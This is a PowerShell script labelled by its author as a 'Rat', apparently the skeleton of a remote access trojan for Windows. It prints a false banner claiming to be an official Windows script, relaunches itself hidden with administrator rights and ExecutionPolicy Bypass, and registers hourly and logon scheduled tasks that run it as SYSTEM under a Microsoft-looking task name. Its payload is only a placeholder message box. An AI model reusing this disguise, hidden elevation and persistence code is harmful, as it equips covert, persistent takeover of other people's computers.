param (
    [string]$run
)
####################################################################################################
# Authors: github.com/NetConnectors
# Description: Rat
####################################################################################################

#Check if the script is running with params
if ($run -ne "o" -and $run -ne "init") {
    Write-Host "###############################################"
    Write-Host "# This is an official Windows Script          #"
    Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
    Write-Host "# DO NOT MODIFY THIS FILE!                    #"
    Write-Host "###############################################"
    Exit
}


function Startup {
    # Make sure the script is running as an administrator
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
        Exit
    }

    # Check if the script is running in a Windows environment
    if ($env:OS -ne "Windows_NT") {
        Write-Host "Not Supported"
        Exit
    }
}

function init {
    schtasks /create /sc HOURLY /tn "Microsoft\Rat" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
    schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
}

function exec {
    # show a message box
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show('Hello World!', 'Hello', 'OK', 'Information')
}

function main {
    $ProgressPreference = 'SilentlyContinue'
    Startup
    if ($run -eq "init") {
        init
    } 
    if ($run -eq "o") {
        exec
    }

    $ProgressPreference = 'Continue'
    Exit
}

main